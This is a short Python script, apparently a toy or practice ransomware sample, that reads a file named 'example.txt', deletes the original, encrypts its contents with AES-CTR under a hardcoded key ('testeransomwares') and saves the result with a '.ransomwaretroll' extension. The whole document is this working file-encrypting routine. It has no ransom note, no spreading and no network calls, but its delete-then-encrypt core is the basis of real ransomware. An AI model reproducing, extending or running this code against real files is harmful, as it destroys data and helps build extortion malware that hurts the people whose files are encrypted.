import os
import pyaes

# File to be encrypted
file_to_encrypt = "example.txt"

# Read the file
with open(file_to_encrypt, "rb") as original_file:
    original_content = original_file.read()

# Delete the original file
os.remove(file_to_encrypt)

# Encryption key
encryption_key = b"testeransomwares"
aes_cipher = pyaes.AESModeOfOperationCTR(encryption_key)

# Encrypt the content
encrypted_content = aes_cipher.encrypt(original_content)

# Save the encrypted file
encrypted_file_name = file_to_encrypt + ".ransomwaretroll"
with open(encrypted_file_name, "wb") as encrypted_file:
    encrypted_file.write(encrypted_content)

